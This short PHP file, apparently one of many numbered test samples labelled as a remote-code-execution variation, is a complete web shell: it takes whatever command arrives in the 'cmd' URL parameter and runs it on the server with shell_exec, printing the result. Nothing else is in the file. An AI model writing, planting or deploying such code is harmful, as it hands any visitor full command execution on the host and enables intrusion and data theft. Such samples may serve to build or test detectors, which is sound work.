<?php
// RCE test variation #1436
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>